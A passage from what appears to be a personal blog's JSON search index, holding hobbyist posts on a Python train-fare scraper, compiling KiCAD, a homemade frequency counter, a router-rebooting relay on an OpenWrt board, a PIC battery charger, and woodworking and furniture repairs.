print(\u0026#39;Begun thread\u0026#39;) self._open = True def run(self): global all_fares while self._open: # Grab a train from train_queue. train = self.train_queue.get() # And process it. all_fares[train[\u0026#39;date\u0026#39;]] = linear_profile_days( train[\u0026#39;depart\u0026#39;], train[\u0026#39;destination\u0026#39;], train[\u0026#39;date\u0026#39;], search_days=0) # Mark the train_queue job as done. self.train_queue.task_done() def close(self): print(\u0026#34;Closing\u0026#34;, self) self._open = False That was surprisingly painless, and I can almost read it. Maybe I should finally learn some object-oriented stuff (I mainly write scripts to make daily tasks easier, and it\u0026rsquo;s always seemed overkill). Anyhow, then we just populate the queue and start the threads:\ntrain_queue = queue.Queue() for day in range(search_days + 1): date = start_date + timedelta(days=day) train_queue.put({ \u0026#39;depart\u0026#39;: depart, \u0026#39;destination\u0026#39;: destination, \u0026#39;date\u0026#39;: date }) threads = [ ThreadProfileTrains(train_queue) for _ in range(parallel_threads) ] for t in threads: t.setDaemon(True) t.start() \u0026hellip;and wait for it to finish. There\u0026rsquo;s got to be a neater way to sort than this, but this is what came to me (a little knowledge is dangerous):\ntrain_queue.join() for t in threads: t.close() global all_fares ordered_dates = sorted(list(all_fares.keys())) trains = OrderedDict() for d in ordered_dates: trains[d] = all_fares[d] At that point we\u0026rsquo;ve written most of the functions (see the source, below), and just need to plot, which is easy with pyplot, and manage args, which is even easier with argparse (after years of drowning in optarg whenever I need to I can finally add arguments painlessly). And we can download in no time (I limited the threads to 5 to be kind, but it\u0026rsquo;s still fast), plot and zoom around; for more information, save to csv, open in a spreadsheet and use standard data manipulation tools. Now you know when to travel: Much clearer than online! Code—if you want a laugh—is over at gitlab.\n(Update: the code is a risable as ever, but I added a very basic gui at the request of my father. If anybody\u0026rsquo;s interested, email me and I\u0026rsquo;ll clean the code up and put it on Pypy.)\n","permalink":"https://2e0byo.github.io/post/coding/chuffchuff-cheaply/","tags":null,"title":"ChuffChuff (cheaply)"},{"categories":["Computing"],"contents":"Since this has, alongside other things, occupied a whole day, I thought I\u0026rsquo;d put it up here in case anyone else tries. Back in the day KiCAD had a python scripting console. Currently that would be very useful: but it\u0026rsquo;s implemented with gtk2, and everything ships with wxwidgets compiled against gtk3. So we have to compile wxwidgets, which is fairly straightforward: get the sources compile\u0026mdash;except it\u0026rsquo;s not a ./configure, make, make install job: rather a python script calls other python scripts, and so on. And of course there was a problem: a function whose argument might not be a char buffer throws a format-security error, and the whole thing won\u0026rsquo;t work. Normally we\u0026rsquo;d just edit the GCC flags and set -Wno-format-security, but how to do that here? I spent ages ag-ing around the sources trying to find out where the python code actually called gcc, and was about to give up. Then I thought of environment variables. In fish (which is not quite bash-compatible) we do:\nenv CPPFLAGS=\u0026#39;-Wno-format-security\u0026#39; python2 build-wxpython.py --build-dir=../bld and it works! Turns out environment variables are inherited unless strictly barred, or something like that. Anyhow, I didn\u0026rsquo;t think it would get through the subprocess.run or whatever, and it does. Then the KiCAD sources are semi-easy: unless you actually know how CMake works or are lucky (unlike me) don\u0026rsquo;t worry about trying to get it to select your just-compiled wxwidgets: I just temporarily replaced /usr/bin/wx-config with a symlink to /usr/local/bin/wx-config and it used the right library. Compilation takes a lot of time\u0026mdash;more than an hour on this system\u0026mdash;but after setting LD_LIBRARY_PATH here (I have no login manager and use startx to load i3, so I tend to have to set things: if you\u0026rsquo;re on gdm you\u0026rsquo;re possibly fine) it loads. Now hopefully if anyone else tries it won\u0026rsquo;t take them a whole day.\n","permalink":"https://2e0byo.github.io/post/computing/compiling-kicad-wxwidgets/","tags":null,"title":"Compiling KiCAD/WxWidgets"},{"categories":null,"contents":"Now that we have a working counter and display the next thing to look at is the timebase. The timebase I built when first working on this counter is odd. It uses, for some reason, a 3.2768MHz crystal divided by (2^16 * 10n) to get a gate pulse which is a multiple of 1s, then further divided and decoded by a 3-to-8 decoder to generate pulses which latch the counter onto the display, and reset the counters. This much was copied from EMRFD but without the intelligence that excellent book expects: obviously, this solution is fine for a quick gate but highly tedious for the long gates I decided to add, as well as being useless for pulse-width-counting, which I wanted to make it do like G0UPL\u0026rsquo;s counter—the other project I copied rather blindly. I\u0026rsquo;d be much better off with a 10 or 20MHz crystal and drop the needless 2^16 counter. But more on that later when I finish it.\nAfter wiring and rewiring, and wiring in circles, we have a switchable timbase, using real hcmos logic, and a gate, using improvised diode logic (more ICs in the post). This involved one of those multipole-rotary switches. I have a few, and none of them make sense. So I took the case off: it seems this is a three-pole four-throw device, but with the the contacts all so oxidsed most don\u0026rsquo;t conduct. I cleaned them off:\nBefore\nAfter\nAnd then took out two of the sliders. Now if we connect the three poles together we have a twelve-way one-pole switch, which is much more useful here. I also removed the completely unneccasery third connection to the hc138 3-to-8 decoder, as two inputs produces 2^2 = 4 outputs, which for 3 pulses is fine. Then we need RTL as the 138 is an active-low device, but the reset and gate pulses are active-high. Connect it all together and we can count our own timebase:\nTimebase Count\nNow what is that last digit about? Surely, unless it drifts .2Hz (this is actually timebase/10) during the count it should always read 0? But at any rate, it\u0026rsquo;s clearly working. I didn\u0026rsquo;t show you any photos when things weren\u0026rsquo;t. For another project I need to know how fast one of those OpenWRT boards can bit-twiddle. So I toggled a gpio with the shell (just echo \u0026lsquo;1\u0026rsquo; or \u0026lsquo;0\u0026rsquo; to the pseudo-file):\nOpenWrt Board\nWaveform\nCount\nAbout 1.6KHz. That\u0026rsquo;s more than quick enough. Here\u0026rsquo;s another shot with the brightness turned up (the change in value is unrelated, it was not stable!):\nAnd we have a working (if not at all finished) peice of test equipment. I\u0026rsquo;ve sorted out the control logic in my head and half on paper, so that will follow shortly when some flip-flops and logic arrive to build it.\n","permalink":"https://2e0byo.github.io/post/electronics/frequency-counter/basic-counter/","tags":["Frequency Counter"],"title":"Basic Counter"},{"categories":["Computing","Electronics"],"contents":"The internet in Durham, which was allowing me to use the workstation there remotely, has gone down; support tell me to \u0026rsquo;turn it off and on again\u0026rsquo;. But obviously I can\u0026rsquo;t do that remotely. Ah well, it wasn\u0026rsquo;t really needed. But what if it were? I\u0026rsquo;ve run servers over unreliable wifi links with good uptime before, with a failsafe script which rebooted everything if it couldn\u0026rsquo;t ping the gateway for too long—and looking at the logs, sometimes it was needed. But I can\u0026rsquo;t reboot the router (and though I\u0026rsquo;ll replace it, there\u0026rsquo;s little opensource DSL firmware, so I\u0026rsquo;m never going to be able to reboot the modem). So what we need is the remote equivalent of pulling the plug out and putting it back in again. I have a few of those Poor Man’s Rasberry Pi boards lying around; one could surely be made to pulse a relay if it can\u0026rsquo;t ping after a while? But the only relays I have (mainly rescued from a faulty boiler) are designed for industrial 24v DC. I hunted for a while and then gave up on finding any 12v relays. Isn\u0026rsquo;t there a circuit called a voltage doubler? As usual, SM0VPO has some information. I was going to use a 555 timer, but that shamed me: I can still build a discrete multivibrator—it was one of the first circuits I ever built, after all. But first off the relay inline in an extension cord. Here I made a completely daft error: the box is about 100% too long, because I thought the cable exit grommets went the other way round. But anyhow, here is how to make a box out of hardboard, that most intractable thing:\nCut\nMark holes\nDrill\nTemporary clamp to drill ends\nEnlarge holes\nGlue ends\nGlue up\nWell that wasn\u0026rsquo;t too bad. One face is screwed with very small screws into small bits of ply glued on the inside of another face. Here\u0026rsquo;s the thing all wired up:\nNow for the circuitry. First I built a simple doubler and switched the whole thing as the load of a bc547 common-emmiter switch. Then I found an easily accessible gpio and soldered a length of magnet wire to it: first problem—it boots up high. Now we can\u0026rsquo;t simply invert that, as the line will go low when the board reboots, and it should be able to do that without switching the load. So the first idea was to AND one inverted and one ordinary GPIO, so I built the rather silly bit of RT/DL on the LHS of the schematic. Except that the firmware goes into failsafe mode if it detects any kind of load on some of the GPIOs, and one of those I\u0026rsquo;d picked was clearly one of them. Worse, in testing it I managed to short the 12v rail to ground, and something on the board blew up with a nasty smell. On reboot it refused to boot; I hunted for a while and then gave up. So that board is now scrap (aren\u0026rsquo;t we glad it\u0026rsquo;s not a Pi!). For the 99p it cost you couldn\u0026rsquo;t even get the PSU, so I\u0026rsquo;m not too heartbroken. A better idea, I decided, was to use the power LED and the GPIO it didn\u0026rsquo;t mind me connecting to something. So the final schematic:\nAnd after logging in remotely, I can turn the relay on and off by setting gpio 18 low:\nNow to take it up to Durham and see if it works up there—and whether it scares anyone. _Update: _After about two months of constant usage, I have not had to reset the internet by hand once. Looking at the logs, it frequently goes down, but generally resets itself; so far we\u0026rsquo;ve needed about three reboots. Incidentally, when using this manually to reboot the internet, one must remember to start screen and then execute something like relay_on.sh; sleep 10; relay\\_off.sh otherwise it turns off the router you are using to connect and you can\u0026rsquo;t turn it on again, short of unplugging the relay. The board has plenty of spare cpu power, and is also the DNS server, and keeps track of the public IP address.\n","permalink":"https://2e0byo.github.io/post/electronics/off-and-on-again-remotely/","tags":null,"title":"'Off and on again' remotely"},{"categories":["Electronics"],"contents":"I started this peice of test equipment when I was about 15, I think, built the timebase with enthusiasm, the counting chain with a bit less, and then wondered how on earth I was to attach the 7-segment displays. Surely not one wire each?! So the project languished, and eventually got relegated to the shelf without ever being finished. All I had was the breadboard and two schematics which nearly corresponded with what was in front of me:\nCounting chain and decoders\nTimebase\nI seem to have started on a more sensible switching scheme, with diode and gates summed at a transistor (might it not be more sensible to use a CMOS Nand gate if we\u0026rsquo;re going to handle higher frequencies?). Coincidentally I amassed a lot of ATA cables, which have 40 pins. 10 digits with decimal places = 80 leads + ground: could I make a pcb and and use two ATA cables to connect the board to the counting chain? A frequency counter/pulse width measurer would be very useful, and I keep improvising them with MPUs. When I ordered parts for the battery charger (on which more later) I picked up 100 0805 150R resistors. I remembered I\u0026rsquo;d settled on them to drive the digits, and didn\u0026rsquo;t re-check the calculation: this was to prove interesting later. Then time to fire up KiCAD and make a very fiddly board:\nI\u0026rsquo;m getting the hang of the global tools. Still, I should 1. have set the clearance higher and 2. have used an autorouter, as some of those tracks are dangerously close. In fact, transferring was a complete nightmare\u0026mdash;the glossy surface of the paper won\u0026rsquo;t come off and I had to go around nearly every track with a needle. Next time different paper. Etch and etch and etch, for about 3 hours: the etchant hit saturation quite early. Also need a bigger, and vertical etching tank. Here\u0026rsquo;s the result:\nAs you can see I left the toner on to guide the drilling, which made things a lot easier. I also drilled the ata header pins at 0.8mm and had to re-drill at 1mm. Then gluing (with a small wire dipped in superglue) and soldering all the resistors, and then the digits and headers:\nAt this point I discovered the \u0026lsquo;key\u0026rsquo; pin on an ATA cable which is blanked, and cut the corresponding header pins. Later I found non-keyed cables and had to solder the pins back in place, which was hard work. Now we just need something to wire up the other end with. My preference is magnet wire: I have lots of it, it\u0026rsquo;s easily stripped with the iron at ~380 but the odd brush with an iron at 290 (soldering temperature) will do it no harm, unlike plastic-sheathed cable which will instantly fuse. So I had to cut and \u0026lsquo;strip\u0026rsquo; 80 little bits of wire, which was tedious, and then solder them onto some stripboard along with the headers:\nAnd then several hours to solder them all to the driver ICs, and correct the odd wiring mistake from when I first built this board. As you can see, it\u0026rsquo;s rather bright; in fact, so bright I quickly got a headache:\nThose last digits are all \u0026lsquo;8s\u0026rsquo; because they\u0026rsquo;re counting faster than persistence of vision, as the scope show:\nThe 74hc4051 driving the rightmost (LSB) digit didn\u0026rsquo;t work properly, probably because I had a bright idea and tried to strip some magnet wire attached to it and overheated it. I swapped it for an old 4511 (not HC) which was to cause me problems. For now it needed to be dimmer, and I wasn\u0026rsquo;t replacing those 150R resistors. PWM was the obvious way to go, and I threw together a test using the ￼Pinguino and a transistor to switch the ground return. It does work:\n…kind of: that 4511 is not driving properly. In fact, it doesn\u0026rsquo;t like working at all into a PWM load. I was stumped for a long time, and eventually decided to replace it and ignore the problem for now. So I build a 555 based PWM driver (the same one the whole internet builds) and connected it up. Then in a fit of inspiration I tried reading the datasheet for the 4511, which points out that the enable pin may be used for \u0026lsquo;brightness control\u0026rsquo;. Duh! Feeding the PWM into the enable and grounding the display board gives me a nice smooth adjustable brightness:\nAs you can see, there used to be a linear PSU on the board, but it was silly and inefficient so I replaced it with a 5v SMPSU of the plug-in kind. Now we have the counter and display: all that\u0026rsquo;s needed is the gating logic, an input amplifier and a case. I may, finally, finish this thing!\n","permalink":"https://2e0byo.github.io/post/electronics/frequency-counter/display-board/","tags":["Frequency Counter"],"title":"Display Board"},{"categories":["Electronics","Repairs"],"contents":"This is a very simple project indeed: add a line-in input feeding the amplifier in my sister\u0026rsquo;s CD/Tape/Radio, which has much better sound than the \u0026lsquo;device\u0026rsquo; she mainly plays music from. How hard can it be to find the amplifier IC and feed in directly?\nTaking the thing apart was none too hard, and it\u0026rsquo;s cheap \u0026rsquo;90s hardware so all through-hole and single-sided PCB. I found the mode switch, traced it back to the amplifier, paid careful attention to the pinouts and soldered a small cable onto one input, the other end going to a 555 \u0026lsquo;signal generator\u0026rsquo; kit I had lying around. Power up: the signal generator exploded and the lcd backlight died.\nApparently I\u0026rsquo;m not so good at tracing PCBs as I thought. The thing now was to repair the backlight: it showed no continuity in either direction so I wondered if it were blown. Getting at it to find out required taking the whole front off, in the process of which I lost a tiny screw and had to find a replacement, and an annoying half hour of trying not to break everything. And then the thing was fine… So now I needed some way to turn it on when in CD mode. Fortunately I\u0026rsquo;d taken everything apart, so it was quite easy to trace the connection to the CD board and carefully measure the voltage at the requisite pin. I found two: 12v and 5.2v, switched by the mode switch. Trying to trace back the led driving circuit showed a lot of very complicated things everywhere; I\u0026rsquo;ve no idea why. A 220R (I think) and the backlight lights up fine.\nOn the way I brushed the probe against the next pin, and the left speaker crackled. So I got interested, guessed, and touched another pin: the right speaker. Attaching a 3.5mm socket in place of my dead signal generator confirmed that I got good sound out with about 50% volume in. I should probably fit an attenuator, but meh. What happens if both CD and external input run? I expected a simple mixing, but instead one dominates. It\u0026rsquo;s probably not a good idea to risk backfeeding the A/D converter by doing this: really I should add a switch, and have it illuminate the LCD when the internal CD is selected. But after hunting I couldn\u0026rsquo;t find a 3-pole double-throw switch anywhere and gave up. So here is the new unit:\nDrill\nUgly, but functional.\nCompleted.\n[gallery ids=\u0026ldquo;164,165,166\u0026rdquo; type=\u0026ldquo;rectangular\u0026rdquo;] The flexible lamp in the first photo is jolly handy for this kind of thing, even if over-using it gives me a headache. It also uses the worlds silliest regulator. Maybe at some point I\u0026rsquo;ll write that up as well…\nIf you try this with a bit of old audio equipment don\u0026rsquo;t rush in with a signal: just brush the suspected input pin with a probe or a bit of wire: if you\u0026rsquo;ve got the right pin you\u0026rsquo;ll hear crackling, and if you haven\u0026rsquo;t it won\u0026rsquo;t blow anything up ;)\n","permalink":"https://2e0byo.github.io/post/electronics/cd-player-line-in/","tags":null,"title":"CD Player Line-In"},{"categories":["Bookbinding"],"contents":"A while ago I made one of those vices used for bookbinding which is called a \u0026rsquo;lying press\u0026rsquo;, not because it is used to print articles for the Lügendpresse, whoever that might be, but because it is a press and lies down, in a bench called a tub. There are many drawings, etc, all over the internet. My press is a little different: I used old windowsill \u0026lsquo;mahogany\u0026rsquo;, and took advantage of the profile to make one side a \u0026lsquo;backing press\u0026rsquo; with protruding jaws planed away after a picture I found in an old book somewhere. Nobody seems much to bother with them these days, but it was fun; in fact the whole thing was fun: finished up to a very high degree of accuracy entirely with hand tools, including planing all the timber square with a marvellous 22\u0026quot; wooden smoothing plane.\nFor bookbinding you need a lying press, another press to glue in (standing press?), a plough to cut off the edges, and a tub to stand—sorry, lie—the lying press in. But you can get away with a chisel to cut off the edges, and balance the press on old timber; so I never got round to the tub or the plough. It still, largely, works:\n…at least, if the chisel is nice and sharp. Now, about those other two components… the plough will have to await another post, though I think it will happen shortly (I\u0026rsquo;ve a load to bind, and using a chisel rapidly gets annoying). But the tub is simple, right? It just needs to be a solid open frame, completely square, and easy to take apart (the press lives indoors—I finished the timber square three times before working out that daily moisture variation was what was changing its size).\nA half-lapped bolted frame of 2x4 seems good enough. I don\u0026rsquo;t mind the height above the bench, but it needs to be deep enough to take a slightly-larger-than-a4 book cover. 12\u0026quot; plus the ~3\u0026quot; height of the jaws should do. First cut all the timber to size:\nNothing much interesting yet. A lot of marking up to do:\nDrill out half, to mark the other half off, and then the easy bit—all the cross cuts [gallery ids=\u0026ldquo;148,149\u0026rdquo; type=\u0026ldquo;rectangular\u0026rdquo;] And then the hard bit: the rip cuts. There are 2x4x2+2x2 = 20 rip cuts to do, and all need to be right on the line, as touching up is no fun, even with a shoulder plane (which I don\u0026rsquo;t have). When you\u0026rsquo;ve finished that you\u0026rsquo;ll realise just how daft the idea that one has to go to the gym to exercise really is…\nThen chisel out the mortices, and mark everything through the holes, test assemble, and drill:\nIf you look carefully you\u0026rsquo;ll see (as usual) that that assembly is the wrong way round. What\u0026rsquo;s worse is that I spent a while thinking about it. Fortunately the holes were sufficiently standard to work the other way round, too. It went together:\nThe bolts were far too long: in fact, so long that I cut off the excess, peened a head on it like a rivet, added a nut and used them as bolts on the other side. I\u0026rsquo;ve left the bottom bolts long, mainly because I was getting tired by this point. Here\u0026rsquo;s the full thing, in its glory:\nNow to make something with it—but that\u0026rsquo;s another post.\n","permalink":"https://2e0byo.github.io/post/bookbinding/more-bookbinding-tools/","tags":null,"title":"More bookbinding tools"},{"categories":["Electronics"],"contents":"By this point we have all we need for a basic charge, and I do actually need to charge some batteries. I can build a simple current regulator with an LM317 and a resistor, which will be good enough for now.\nNo Termination The simplest thing would be just to charge some batteries and log to the computer. There\u0026rsquo;s a marvellous thing out there called FeedGnuPlot which makes graphing realtime or static data so easy one has to resist the temptation to graph everything. But before we can do that, we need to be able to read analogue values and throw them over USB.\nCode The Pic has a lot of ADC inputs, and Pinguino supports using all of PortA as analogue input. The code is incredibly simple:\n#define batteryIn 0 unsigned int raw_adc; raw_adc = analogueRead(batteryIn); But because ADCs can jitter a bit, I generally take an average. I should really work out if this is worth it, particularly as the PIC can\u0026rsquo;t do floating point (more on that later):\nunsigned int total = 0; unsigned int i; void get_voltage(){ total = 0; for (i=0; i\u0026lt;10; i++) { total += analogRead(0); } raw_adc = total / 10; return; } the preprocessor+compiler+goodness knows what else here has problems with sensible things like declaring i in the for loop, so there we go. The default behaviour of division on the PIC with integers is to truncate, which isn\u0026rsquo;t great, so we define:\nunsigned int round_closest(unsigned int dividend, unsigned int divisor) { return (dividend + (divisor / 2)) / divisor; } Which came, I think, from StackExchange, but is pretty simple to understand. Now we just need to print the logged values over USB. One would think that the inbuilt CDC (Usb Serial) library would be ideal, but unfortunately it won\u0026rsquo;t compile… The Pinguino IDE .deb from the main website depends upon something—I forget what—which there is no longer a debian package for, but which installs fine via pip. So I went looking for the ide source, and found that the official GitHub repository only has v11, but the downloaded debs (which include the libraries) are v12 (!). At some point I should unpack the .deb, edit out the dependency, and re-install; for now I\u0026rsquo;m using v11 with the kludge of pointing it at the v12 libraries. Hopefully that\u0026rsquo;s why it doesn\u0026rsquo;t work, as CDC would be nice\u0026mdash;it greatly simplifies reading from the computer. I was stumped, and then found the inbuilt \u0026lsquo;BULK\u0026rsquo; USB mode. I don\u0026rsquo;t know enough about USB to know what it\u0026rsquo;s doing (other than not emulating a serial port), but the library comes with a simple Python script to read a string sent with BULK.printf(). That gives us everything we need for a first basic test. Here\u0026rsquo;s the rather hasty mock-up. Note the potential divider feeding the ADC to protect it from the full voltage.\nUnfortunately I deleted the log, so I can\u0026rsquo;t screenshot gnuplot, but here\u0026rsquo;s a screenshot from the code I wrote to play with termination conditions. In reality the curve continues to the right and starts climbing again, which is when we\u0026rsquo;re into overcharge, but I truncated the data.\nClearly, it works. Now to get it to work out when to stop charging.\n","permalink":"https://2e0byo.github.io/post/electronics/battery-charger/proof-of-concept/","tags":["orphaned projects","Battery charger"],"title":"Proof of Concept"},{"categories":["Electronics"],"contents":"As part of the Battery Charger project I need a basic PIC dev board. I built one a long time ago for A2 coursework, and I even found the artwork lying around, but the tracks and pads were too small for hand etching and drilling. Trying to open the cad files in KiCad I discovered that they\u0026rsquo;ve changed everything, and half the symbols \u0026lsquo;cannot be found\u0026rsquo;. I\u0026rsquo;ve also completely forgotten how to use KiCad or schematic capture/Pcb design software in general: all pointing to a need to redraw.\nAfter rather too long I proudly examined the result:\nIt\u0026rsquo;s incredibly basic: just a few headers, crystal, usb, and a few resistors and capacitors. The wiggle in that track is to balance up the differential length; it\u0026rsquo;s completely pointless at this scale but I quite liked it. If you look closely at the schematic you can see what I didn\u0026rsquo;t: the D+ and D- are wired to the wrong pins. If you look even harder you\u0026rsquo;ll notice that not-MCLR is tied to ground not VCC, so the MPU won\u0026rsquo;t even run. I didn\u0026rsquo;t notice that; more frustration.\nThe Pcb was made the usual way: print to photo paper from a laser, clean board with wire wool and ethanol, iron on, soak paper, scrub off with scourer, etch, clean. Google \u0026rsquo;toner transfer pcb\u0026rsquo; and you can find a lot of people who know a lot about it. I half-remembered, but it worked fine:\nDoes anyone know the concentration of ferric cholride for etching? I\u0026rsquo;ve lost the scrap of paper I used to keep pinned to the board with it written on, and it seems no-one thinks of niceties like that online\u0026hellip; in the end I took a ratio, which was too dilute. But it etched in the end. Then to assemble, and mount on a bit of ply with an lcd module, regulator, and a scrap of pcb to develop on:\nProgram:\n\u0026hellip;and test. Of course, it didn\u0026rsquo;t work, because of those two idiotic mistakes.\nMoving the resistor was easy, moving the usb lines more annoying:\nPlug in the programmer, download the Pinguino bootloader (only available from a GitHub repository!), plug the usb into the computer and \u0026rsquo;lsusb\u0026rsquo;: it shows up! Artwork and files will go up on my Gitlab repository when I have re-drawn.\n","permalink":"https://2e0byo.github.io/post/electronics/pic-development-board/","tags":null,"title":"PIC Development Board"},{"categories":["Electronics"],"contents":"There are lots of \u0026lsquo;smart\u0026rsquo; chargers out there. Most of them boast that they can charge your batteries quicker than the competition, and that a \u0026lsquo;smart\u0026rsquo; algorithm will somehow prevent packing as much current as possible into a cell in the shortest time from having deleterious effects. Slow chargers are harder to come by: there are the cheap constant-current things you run for a certain amount of time—but if your batteries are not absolutely dead they will overcharge, and probably overheat and explode, as mine did. So not ideal. A few vacations ago, as a break from reading, I converted an old analogue ammeter into a basic adjustable-current charger with current and voltage read-off. The current regulation is not particularly clever. It uses the \u0026rsquo;trick\u0026rsquo; I devised for my AS Electronics coursework\nUnfortunately I neglected to allow for heat, and this thing drifts after a while. It does eventually stabilise, but not much of a regulator. But I also had an ARM MBed someone gave me, so I logged the voltage over USB and graphed it: when the batteries hit charge there\u0026rsquo;s a negative dV/dt which you can easily see and turn off the charger.\nThe usual, sensible solution is to put the resistive element in the adj line, which avoids power dissipation in it. But oh well. Here, incidentally, is the only picture I can find of the coursework. It wasn\u0026rsquo;t pretty, but it worked.\nIt used RDL / RDTL logic for everything; I was being difficult.\nWishlist The ability to watch the charge on a computer is very useful: I\u0026rsquo;ve been able to recover some \u0026lsquo;dead\u0026rsquo; batteries by watching the curve at low current—the \u0026lsquo;smart\u0026rsquo; chargers were terminating on the first \u0026lsquo;blip\u0026rsquo;, long before the battery was full. Also, one should be able to leave a charger running and know it\u0026rsquo;ll turn off; and the conditions for doing so as well as the shape of the charge should be easily modifiable in software. I no longer have a laptop with serial or parallel ports, so communication really needs to be over USB. Lastly, this is merely a break from reading, so it should be built easily with things I have on hand. So:\nMPU based (how else?) programmable and logging over USB voltage sense software controllable charging current programmable charge profile Hardware The only MPUs I have on hand are PIC18 devices. I\u0026rsquo;ve written a lot of assembler in the past, and cannot remember any of it. So it needs to be higher level than that: I spent a fruitless few hours looking through usb stacks in C. All much too complicated to throw together in a hurry, or refusing to compile: I spent a few more fruitless hours compiling an old version of SDCC to compile one of them, only to discover that I had no development board spare. Meanwhile reading is not getting done nor batteries charged. Rooting through old files I rediscovered the (rather dormant) Pinguino project. Arduino-like simplicity (and no doubt overhead, but who cares?), native USB and LCD libraries, etc. That would be nice. So now I need a development board, and then at the very least I can have the PIC log over serial like the MBed used to. The current regulator, etc, will come later, but the PIC has two PWM outputs and I can implement at least one more in software if need be; smooth the voltage and you just need a voltage-controlled current source of no great stability or power, which is not exactly unheard of.\n","permalink":"https://2e0byo.github.io/post/electronics/battery-charger/background/","tags":["orphaned projects","Battery Charger"],"title":"Background"},{"categories":["Computing","Electronics"],"contents":"Embedded Linux is currently all the rage with little boards like the Pi running a full-fledged Debian just to flash a few LEDs. Now certainly, the Pi would find uses here, but it\u0026rsquo;s hardly cheap. What is cheap—or even free—is defunct wireless routers. They, too, are embedded systems running Linux. Unlike the Pi they have on-board wifi and an ethernet switch; the cpu isn\u0026rsquo;t usually too bad either. I also picked a few up for £0.99 on Ebay. Here\u0026rsquo;s one:\nand here\u0026rsquo;s what the board looks like, minus one of the antennas and with the two antenna outputs connected together—a really questionable thing to do which seemed a good idea one evening. I was using a pair of these for an extended wifi signal with home-made (untuned!) Yagis:\nIn fact the wifi hardware, at least under OpenWrt, isn\u0026rsquo;t really up to it: it keeps re-connecting and I never figured out why. But enter OpenWrt or these days LEDE which apparently is to merge back into OpenWrt and take over the name (in the meantime you should use LEDE, it\u0026rsquo;s more up-to-date): originally alternative firmware for the venerable WRT54G, it\u0026rsquo;s now a generic embedded network Linux, and it \u0026lsquo;unofficially\u0026rsquo; supports these routers. Installation is straightforward and on boot you can ssh in and start setting things up. The only drawback is disk space, which is in the few tens of MB. OpenWrt/LEDE uses a strange system with a read-only ultra-compressed filesystem uncompressed on the fly and a read-write compressed file system to store only changes to the read-only system to enable modification (think of it like persistent storage on a memory stick, if you\u0026rsquo;ve ever run linux off a memory stick). Fortunately these things have a usb port, and we can put another compressed read-write filesystem on one, and then use the on-board filesystem to make that the root; we can even mount other filesystems on the memory stick in an ordinary sensible way. Even more fortunately, all this shadowed-file-system stuff is handled transparently by the kernel, and we don\u0026rsquo;t (usually) have to think about it.\nFollow the instructions somewhere like here and remember that there\u0026rsquo;s no point installing anything except usb support before setting it up as the internal / is only accessed during boot in order to transfer to the external.\nNeed more usb devices? Use a hub: the standard takes care of those. GPIOs? Available on the board, and quite a few free on this one. I do not know who had the time or energy to trace those…\nOne of these formed the basis of a clock I built, which will get posted here at some point; another is currently on the bench as part of an internet keepalive, which I should really write up. They\u0026rsquo;re really quite flexible, and the best thing is that they\u0026rsquo;re dead cheap.\n","permalink":"https://2e0byo.github.io/post/electronics/poor-mans-raspberry-pi/","tags":null,"title":"Poor Man's Raspberry Pi"},{"categories":["Workbench"],"contents":"About five years ago now I stopped dreaming of a proper bench vice and built one from some old oak kitchen doors I rescued from a skip, an old oak drawer, and long M6 bolts.\nSome day if I find the pictures I might write it up as an example of how not to do it: I dovetailed the two runners on in opposite directions and a whole host of other things. Still, it\u0026rsquo;s a pretty good vice all told except for those M6 bolts. Of course we should use a proper thread designed for clamping, but I\u0026rsquo;ve now left school so it\u0026rsquo;s too late to cut one on one of the lathes in the workshop, and have you seen the prices? I thought about replacing it with M10 studding, as used in the bookbinder\u0026rsquo;s press, but there\u0026rsquo;s not enough wood on the bottom of the jaws to do it without extending them, and I\u0026rsquo;ve never got round to it. So I view the screws as expendable and replace them with studding when the thread strips.\nExcept that up till now I\u0026rsquo;ve epoxied a pair of locked nuts into the wooden block on the end of the screw, but I don\u0026rsquo;t think it\u0026rsquo;ll take another knock-out-and-re-glue cycle. Really, if this is an \u0026rsquo;expendable\u0026rsquo; it should be easier than that. So when I tried to use the vice and the thread jumped, I put aside whatever I was doing and looked for a block of hardwood. This is old \u0026lsquo;hardwood windowsill\u0026rsquo; saved from when they installed double glazing: the cowboys cut it in half, badly, with a blunt pull saw, to make it easier to get out. They were going to throw it, as well\u0026hellip;\nThere was a drawing, but I\u0026rsquo;ve lost it. The design is simplicity itself: a single nut is hammered into one side of the block to form a captive nut, and a penny washer glued into a recess over it to protect the vice jaws. The studding passes through, and then another nut and washer are tightened down on the other side with a socket. Lots of axial holes (thank goodness for the pillar drill). Also, it\u0026rsquo;s nice working hardwood—it\u0026rsquo;s properly dimensioned!\nThen the block was cut into a rough hexagon and rounded with a simple jig on the neighbour\u0026rsquo;s disc sander (recess a bolt through a bit of ply, clamp it to the table and spin the block on it). If you don\u0026rsquo;t have access to a disk sander make it an accurate hexagon and leave it at that: it\u0026rsquo;s all æsthetic anyhow.\nAssembled, and gluing the penny washer in with PVA. This washer really shouldn\u0026rsquo;t have to do anything, but at least if the nut does come loose it\u0026rsquo;ll protect whatever\u0026rsquo;s the other side.\nAnd then (after filing the cross-hole a bit because the internal nut was slightly proud), we can re-assemble:\nYes, I need a new bench-hook. And the slot the runners move in, which keeps the jaws parallel, has worn a bit and should probably looked at (hence the wedge to square it all up). But that\u0026rsquo;s for another day and another post.\nUpdate: the outer captive nut kept undoing at high tensions, driving the studding into the handle. I probably shouldn\u0026rsquo;t tighten it that much, but it\u0026rsquo;s annoying, so I bought some loctite (blue), and glued the nut on. We\u0026rsquo;ll have to see whether it holds, and whether it can be undone next time it needs replacing.\n","permalink":"https://2e0byo.github.io/post/workbench/vice-screw/","tags":null,"title":"Vice Screw"},{"categories":["Repairs"],"contents":"This posed something of a problem: what do you do when a pinned tenon breaks? The joint was too broken just to glue, neither surface was flat, and the dowels were in the way. In the end I decided to dowel it with three dowls, to leave as much of the broken tenon intact as possible. Dowled joints are easy on flat, square workpeices. On jagged tapering workpeices, now\u0026hellip; With a quarter-inch chisel I cut flats to mark on and marked the three holes on both mortice and tenon. Then I made a jig to make drilling square a bit easier. This wood—generic African hardwood—is like fibreboard. The lip and spur bit just spun on the surface:\nThen the mortice was drilled out on the pillar drill, drilling the two top holes, pinning the jig in place, and using it to drill the bottom, as that landed on so much jagged break:\nTop hole is a little close for comfort. Reassamble the other legs first, so the chair can pull itself square:\nAnd then \u0026lsquo;walk\u0026rsquo; it in with a clamp (don\u0026rsquo;t whack it in with a mallet). All told, not too bad:\nWhat gap?\nGlue for 24h\nIt\u0026rsquo;s not given out yet this week\u0026hellip;\n","permalink":"https://2e0byo.github.io/post/repairs/repairing-a-broken-tenon/","tags":null,"title":"Repairing a Broken 